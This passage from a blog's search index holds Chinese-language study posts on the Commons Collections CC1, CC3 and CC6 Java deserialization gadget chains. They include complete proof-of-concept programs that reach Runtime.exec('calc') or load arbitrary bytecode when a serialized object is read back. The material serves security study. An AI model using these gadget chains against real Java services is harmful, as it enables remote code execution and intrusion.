org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC6Test02 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; map = new HashMap(); Map\u0026lt;Object, Object\u0026gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry( lazyMap,\u0026#34;aaa\u0026#34;); HashMap\u0026lt;Object, Object\u0026gt; map2 = new HashMap\u0026lt;\u0026gt;(); Object o = map2.put(tiedMapEntry, \u0026#34;bbb\u0026#34;); map.remove(\u0026#34;aaa\u0026#34;); Class\u0026lt;LazyMap\u0026gt; lazyMapClass = LazyMap.class; Field factoryFiled = lazyMapClass.getDeclaredField(\u0026#34;factory\u0026#34;); factoryFiled.setAccessible(true); factoryFiled.set(lazyMap,chainedTransformer); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class CC3Test02 { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameFiled = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameFiled.setAccessible(true); nameFiled.set(templates, \u0026#34;aaa\u0026#34;); Field bytecodesFiled = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesFiled.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\u0026#34;E://Test.class\u0026#34;)); byte[][] codes = {code}; bytecodesFiled.set(templates, codes); Field tfactoryFiled = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryFiled.setAccessible(true); tfactoryFiled.set(templates, new TransformerFactoryImpl()); //templates.newTransformer(); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templates), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map\u0026lt;Object, Object\u0026gt; map = new HashMap(); Map\u0026lt;Object, Object\u0026gt; outerMap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;aaa\u0026#34;); Map expMap = new HashMap(); expMap.put(tme, \u0026#34;value\u0026#34;); map.remove(\u0026#34;aaa\u0026#34;); Class\u0026lt;LazyMap\u0026gt; lazyMapClass = LazyMap.class; Field factoryFiled = lazyMapClass.getDeclaredField(\u0026#34;factory\u0026#34;); factoryFiled.setAccessible(true); factoryFiled.set(outerMap, chainedTransformer); serialize(expMap); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } CC3 （InstantiateTransformer） 分析： 而在 ysoserial 中并没有使用 InvokerTransformer，这是因为黑名单过滤时很有可能会将 InvokerTransformer 直接禁用，为了更广泛的使用， ysoserial 换了一条路：\n《Java 安全漫谈》中也有提及\n2015年初，@frohoff和@gebl发布了Talk《Marshalling Pickles: how deserializing objects will ruin your day》，以及Java反序列化利用工具ysoserial，随后引爆了安全界。开发者们自然会去找寻一种安全的过滤方法，于是类似 Serialkiller 这样的工具随之诞生。\nSerialKiller是一个ava反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。在其发布的第一个版本代码中，我们可以看到其给出了最初的黑名单：\n这个黑名单中InvokerTransformer赫然在列，也就切断了CommonsCollections1的利用链。有攻就有防，ysoserial随后增加了不少新的Gadgets，其中就包括CommonsCollections3。\nCommonsCollections3的目的很明显，就是为了绕过一些规则对InvokerTransformer的限制。CommonsCollections3并没有使用到InvokerTransformer来调用任意方法，而是用到了另一个类，com.sun.org.apache.xalan.internal.xsltc.trax.TrAxFilter。\n现在继续找 newTransformer 的用法：\n这里的 Process 只是 exec() 的返回值，如果你不去读它的输出或等待它结束，它就没用了，一般对象，不用它\ngetOutProperties，是反射调用的方法，可能会在 fastjson 的漏洞里面被调用。\nTransformerFactoryImpl 不能序列化，并且构造函数传参困难\nTrAXFilter 也不能序列化，但构造函数简单，想着调用 TrAXFilter 的构造函数\n那么如何使用 TrAXFilter 的构造函数，这里用到了 InstantiateTransformer\nInstantiateTransformer.transform 判断传入的参数是否为 Class 类型，如果是，获取指定构造器，调用构造函数。\n构造POC： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import javax.xml.transform.Templates; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.*; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class CC3Test03 { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameFiled = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameFiled.setAccessible(true); nameFiled.set(templates, \u0026#34;aaa\u0026#34;); Field bytecodesFiled = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesFiled.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\u0026#34;E://Test.class\u0026#34;)); byte[][] codes = {code}; bytecodesFiled.set(templates, codes); Field tfactoryFiled = tc.getDeclaredField(\u0026#34;_tfactory\u0026#34;); tfactoryFiled.setAccessible(true); tfactoryFiled.set(templates, new TransformerFactoryImpl()); //添加 InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); Transformer[] transformers = new Transformer[]{ //修改 new ConstantTransformer(TrAXFilter.class), instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;value\u0026#34;); Map\u0026lt;Object, Object\u0026gt; transformedMap = TransformedMap.decorate(hashMap, null , chainedTransformer); Class\u0026lt;?\u0026gt; c1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Target.class, transformedMap); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 总结： 本次就将 CC1、CC3、CC6放在一起吧：\n","permalink":"http://localhost:1313/xvsf/posts/cc3/","summary":"\u003cp\u003e再次深入学习动态加载字节码：\u003c/p\u003e\n\u003ch1 id=\"动态加载字节码\"\u003e动态加载字节码\u003c/h1\u003e\n\u003ch2 id=\"1什么是java的字节码\"\u003e1、什么是Java的字节码\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。\u003c/p\u003e","title":"CC3"},{"content":"环境： JDK 8u71:\nhttps://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\nComoons-Collections 3.2.1\nCC6 链分析： 在 CC1 中分析过 JDK 8u71之后的 AnnotationInvocationHandler.readObject 的写法改变，导致 CC1 链用不了，也就是说：\nAnnotationInvocationHandler.readObject\nAnnotationInvocationHandler.invoke.memberValues.get\n这半条链子用不了，所以要找一个替代，这个替代也应该调用了 LazyMap.get 方法，之后的链子和 CC1 一样。\n1、分析 我们找到 TiedMapEntry.getValue 中调用了 get 方法，\n而 TiedMapEntry.hashCode 调用了 getValue ，\n那么我们找哪里调用了 TiedMapEntry.hashCode 就可以完成利用链的跟踪\n这里我用的是《Java 安全漫谈》给出的思路：\nysoserial 中，是利用 java.util.HashSet#readObject 到 HashMap#put() 到 HashMap#hash(key)，最后到 TiedMapEntry#hashCode()。\n实际上我发现，在 java.util.HashMap#readobject 中就可以找到 HashMap#hash() 的调用，去掉了最前面的两次调用：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 public class HashMap\u0026lt;K,V\u0026gt; extends AbstractMap\u0026lt;K,V\u0026gt; implements Map\u0026lt;K,V\u0026gt;, Cloneable, Serializable { ... static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } ... private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u0026lt; 0) throw new InvalidObjectException(\u0026#34;Illegal mappings count: \u0026#34; + mappings); else if (mappings \u0026gt; 0) { // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u0026lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; ft \u0026lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); @SuppressWarnings({\u0026#34;rawtypes\u0026#34;,\u0026#34;unchecked\u0026#34;}) Node\u0026lt;K,V\u0026gt;[] tab = (Node\u0026lt;K,V\u0026gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } 在 HashMap 的 readObject 方法中，调用到了 hash(key），而 hash 方法中，调用到了 key·hashCode(）。所以，我们只需要让这个 key 等于 TiedMapEntry 对象，即可连接上前面的分析过程，构成一个完整的 Gadget。\n2、构造 POC 初步构造：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC6Test { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { //回顾 Transformer 链：Runtime.class -\u0026gt; getMethod(\u0026#34;getRuntime\u0026#34;) -\u0026gt; invoke(null) -\u0026gt; Runtime.getRuntime() -\u0026gt; exec(\u0026#34;calc\u0026#34;) Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class}, new Object[] {\u0026#34;getRuntime\u0026#34;, new Class[0]}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] {Object.class, Object[].class}, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { \u0026#34;calc\u0026#34; }), }; //创建一个 ChainedTransformer，它会按顺序把前一个 transformer 的输出作为下一个 transformer 的输入，从而把上面的步骤串成一条“执行链” ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map\u0026lt;Object, Object\u0026gt; map = new HashMap(); //在 URL DNS 中分析过，put 的时候就会触发 hash,hashCode //这里传入的 new ConstantTransformer(1) 是先用无害 factory 构造结构，后面再通过反射替换成恶意 factory Map\u0026lt;Object, Object\u0026gt; outerMap = LazyMap.decorate(map, new ConstantTransformer(1)); // TiedMapEntry.getValue() 调用 outerMap.get(\u0026#34;key\u0026#34;) TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;key\u0026#34;); //这里要注意 HashMap.put(key, value) 会计算 key.hashCode() //所以当 key 是 TiedMapEntry 时，TiedMapEntry.hashCode() 会触发 getValue()，又会间接调用 outerMap.get(\u0026#34;key\u0026#34;)，如果 outerMap 的 factory 是恶意的就会被触发 //但这里我们先使用 ConstantTransformer(1) 无害构造 Map expMap = new HashMap(); expMap.put(tme, \u0026#34;value\u0026#34;); //通过反射获取 LazyMap 类中私有字段 factory Class\u0026lt;LazyMap\u0026gt; lazyMapClass = LazyMap.class; Field factoryFiled = lazyMapClass.getDeclaredField(\u0026#34;factory\u0026#34;); //访问权限置为可访问 factoryFiled.setAccessible(true); //然后把 outerMap 的 factory 字段替换成我们之前构造的 chainedTransformer //这样就把原先无害的 factory 换成了恶意的 transformer 链 factoryFiled.set(outerMap,chainedTransformer); serialize(expMap); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 但是执行后无事发生，并没有弹出计算器。\n下断点调试：\n发现在 if (map.containsKey(key) == false) { key 的值为 \u0026ldquo;key\u0026rdquo;【也就是这一步 TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026ldquo;key\u0026rdquo;); 】，并没有去执行 factory.transform(key) 。\n在 TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026ldquo;aaa\u0026rdquo;); 处下断点调试：\n可以看到 key 来源于实例化时的传参\n重新修改 POC：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC6Test { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { //回顾 Transformer 链：Runtime.class -\u0026gt; getMethod(\u0026#34;getRuntime\u0026#34;) -\u0026gt; invoke(null) -\u0026gt; Runtime.getRuntime() -\u0026gt; exec(\u0026#34;calc\u0026#34;) Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class}, new Object[] {\u0026#34;getRuntime\u0026#34;, new Class[0]}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] {Object.class, Object[].class}, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { \u0026#34;calc\u0026#34; }), }; //创建一个 ChainedTransformer，它会按顺序把前一个 transformer 的输出作为下一个 transformer 的输入，从而把上面的步骤串成一条“执行链” ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map\u0026lt;Object, Object\u0026gt; map = new HashMap(); //在 URL DNS 中分析过，put 的时候就会触发 hash,hashCode //这里传入的 new ConstantTransformer(1) 是先用无害 factory 构造结构，后面再通过反射替换成恶意 factory Map\u0026lt;Object, Object\u0026gt; outerMap = LazyMap.decorate(map, new ConstantTransformer(1)); // TiedMapEntry.getValue() 调用 outerMap.get(\u0026#34;key\u0026#34;) TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;aaa\u0026#34;); //这里要注意 HashMap.put(key, value) 会计算 key.hashCode() //所以当 key 是 TiedMapEntry 时，TiedMapEntry.hashCode() 会触发 getValue()，又会间接调用 outerMap.get(\u0026#34;key\u0026#34;)，如果 outerMap 的 factory 是恶意的就会被触发 //但这里我们先使用 ConstantTransformer(1) 无害构造 Map expMap = new HashMap(); expMap.put(tme, \u0026#34;value\u0026#34;); //将 \u0026#34;key\u0026#34; 移除 map.remove(\u0026#34;aaa\u0026#34;); //通过反射获取 LazyMap 类中私有字段 factory Class\u0026lt;LazyMap\u0026gt; lazyMapClass = LazyMap.class; Field factoryFiled = lazyMapClass.getDeclaredField(\u0026#34;factory\u0026#34;); //访问权限置为可访问 factoryFiled.setAccessible(true); //然后把 outerMap 的 factory 字段替换成我们之前构造的 chainedTransformer //这样就把原先无害的 factory 换成了恶意的 transformer 链 factoryFiled.set(outerMap,chainedTransformer); serialize(expMap); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 3、总结 利用 LazyMap 在取值时会调用其 factory.transform()，再借助 TiedMapEntry 作为 HashMap 的 key，在反序列化时 HashMap.readObject() 会触发 key 的 hashCode() → TiedMapEntry.getValue() → LazyMap.get() → 恶意的 ChainedTransformer，最终执行任意方法（如 Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;)）\n利用链：\nHashMap.readObject\nHashMap.hash\nTiedMapEntry.hashCode\nTiedMapEntry.getValue.get\nLazyMap.get\nLazyMap.get.factor.transform\nChainedTransformer.transform\nConstantTransformer.transform\nInvokerTransformer.transform\n","permalink":"http://localhost:1313/xvsf/posts/cc6/","summary":"\u003ch1 id=\"环境\"\u003e环境：\u003c/h1\u003e\n\u003cp\u003eJDK 8u71:\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\"\u003ehttps://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003c!-- raw HTML omitted --\u003eComoons-Collections 3.2.1\u003c!-- raw HTML omitted --\u003e\u003c/p\u003e\n\u003ch1 id=\"cc6-链分析\"\u003eCC6 链分析：\u003c/h1\u003e\n\u003cp\u003e在 CC1 中分析过 JDK 8u71之后的 AnnotationInvocationHandler.readObject 的写法改变，导致 CC1 链用不了，也就是说：\u003c/p\u003e\n\u003cp\u003eAnnotationInvocationHandler.readObject\u003c/p\u003e\n\u003cp\u003eAnnotationInvocationHandler.invoke.memberValues.get\u003c/p\u003e\n\u003cp\u003e这半条链子用不了，所以要找一个替代，这个替代也应该调用了 LazyMap.get 方法，之后的链子和 CC1 一样。\u003c/p\u003e","title":"CC6"},{"content":"环境 1、JDK-8u65 https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\n注意：国家不要选为国区，国区对应的 8u65 下载的时候会自动下载 8u111 等高版本！\n2、Maven-commons-collections 3.2.1 https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1\nxml\r1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 3、修改 sun 包-方便调试 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4\n将 jdk-af660750b2f4\\jdk-af660750b2f4\\src\\share\\classes\\sun\n放入：jdk1.8.0_65\\src\n把 src 文件夹添加到源路径下\nApache Commons Collections包和简介: https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/\nCC1链分析： 首先要明白，CC1 链的源头是 Commons Collections 库中的 Tranformer （ org/apache/commons/collections/Transformer.java ）接口中的 transform 方法，这个接口的设计初衷，是为了把一个对象转换成另一个对象， 但是，在实现类里把 transform 变成“可以执行任意逻辑”时，就出现了漏洞。\n这样的类有以下几种：\n最核心、最危险的类：\nInvokerTransformer （执行任意方法，命令执行） InstantiateTransformer （实例化任意类，构造函数触发危险逻辑） 组合辅助类（触发链条的关键）：\nChainedTransformer（组合执行器） LazyMap（触发入口） 1、 TransformedMap 版 《Java 安全漫谈》\nTransformedMap的出处\n既然ysoserial中没有用到TransformedMap，那么TransformedMap究竟是谁最先提出来的呢？\n据我的考证，最早讲到TransformedMap应该是Code White的这篇Slide：Exploiting\nDeserialization Vulnerabilities in Java(https://www.slideshare.net/slideshow/exploiting-deserialization-vulnerabilities-in-java-54707478/54707478)1\t，后来长亭科技的博客文章《Lib之过？Java反序列化漏洞通用利用分析》（https://www.anquanke.com/post/id/82898 原文网站进不去了，只有转载）对此进行了进一步分析，后来才在国内众多文章中被讲到。\n1.1 漏洞利用 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 public class InvokerTransformer implements Transformer, Serializable { private static final long serialVersionUID = -8653385846894047688L; private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; public static Transformer getInstance(String methodName) { if (methodName == null) { throw new IllegalArgumentException(\u0026#34;The method to invoke must not be null\u0026#34;); } return new InvokerTransformer(methodName); } public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) { if (methodName == null) { throw new IllegalArgumentException(\u0026#34;The method to invoke must not be null\u0026#34;); } if (((paramTypes == null) \u0026amp;\u0026amp; (args != null)) || ((paramTypes != null) \u0026amp;\u0026amp; (args == null)) || ((paramTypes != null) \u0026amp;\u0026amp; (args != null) \u0026amp;\u0026amp; (paramTypes.length != args.length))) { throw new IllegalArgumentException(\u0026#34;The parameter types must match the arguments\u0026#34;); } if (paramTypes == null || paramTypes.length == 0) { return new InvokerTransformer(methodName); } else { paramTypes = (Class[]) paramTypes.clone(); args = (Object[]) args.clone(); return new InvokerTransformer(methodName, paramTypes, args); } } private InvokerTransformer(String methodName) { super(); iMethodName = methodName; iParamTypes = null; iArgs = null; } public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } //实现 Transformer 接口，重写的transform方法，把传入的对象 input 转换成另一个对象 public Object transform(Object input) { if (input == null) { return null; } try { //获取传入对象的运行时类 Class cls = input.getClass(); //从 cls 类中，反射获取一个方法对象；iMethodName：构造 InvokerTransformer 时传入的目标方法名（可控）；iParamTypes：方法的参数类型数组（可控） Method method = cls.getMethod(iMethodName, iParamTypes); //调用上一步拿到的 method，并传入参数 iArgs（可控） return method.invoke(input, iArgs); } catch (NoSuchMethodException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; does not exist\u0026#34;); } catch (IllegalAccessException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; cannot be accessed\u0026#34;); } catch (InvocationTargetException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; threw an exception\u0026#34;, ex); } } } 从源码中可知存在反射调用任意类，并且各个参数都是可控的，使用反射调用 Runtime.exec ：\njava\r1 2 3 4 5 6 7 8 Runtime r = Runtime.getRuntime(); //方法名为exec，参数类型为String，参数值为calc InvokerTransformer invokerTransformer = new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;} ); invokerTransformer.transform(r); 1.2 分析漏洞链 现在我们知道了InvokerTransformer.transform() 方法能执行任意命令，但是它自己不会平白无故被调用，必须有别的类/方法调用它， 我们就去找哪些类会在正常逻辑中调用 transform**。**如果有哪个类调用了 transform， 就等于找到了一个“入口点”，只要我们能控制传进去的 Transformer，就能让应用在“正常使用 Map”的时候，自动调用到我们的恶意 transform ，从而执行命令 。\n在 TransformedMap类中找到 checkSetValue()方法调用了 transform()方法\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable { /** Serialization version */ private static final long serialVersionUID = 7023152376788900464L; /** The transformer to use for the key */ protected final Transformer keyTransformer; /** The transformer to use for the value */ //若把 valueTransformer 设为 InvokerTransformer，当它被调用 transform() 时就能执行任意方法/命令 protected final Transformer valueTransformer; //decorate(装饰)，把一个已经存在的 Map 包一层 TransformedMap,以后对这个 Map 做的操作（比如 put），就会先经过 Transformer 处理，再真正存进去 public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } //另一种装饰，decorate：包装，不改已有数据；decorateTransform：先改旧数据再包装 public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) { TransformedMap decorated = new TransformedMap(map, keyTransformer, valueTransformer); if (map.size() \u0026gt; 0) { Map transformed = decorated.transformMap(map); decorated.clear(); decorated.getMap().putAll(transformed); // avoids double transformation } return decorated; } //保存底层 map 和两个 transformer;valueTransformer 是我们需要的关键点 protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; } //自定义序列化，这里的 readObject 并不会主动触发 transformer；它只是把结构恢复 private void writeObject(ObjectOutputStream out) throws IOException { out.defaultWriteObject(); out.writeObject(map); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { in.defaultReadObject(); map = (Map) in.readObject(); } //若有 keyTransformer 则对 key 做变换；这里的“变换”，在正常情况下是对 key/value 做某种转换（如：大小写转换），但在漏洞利用时，“变换”就执行了攻击者的代码 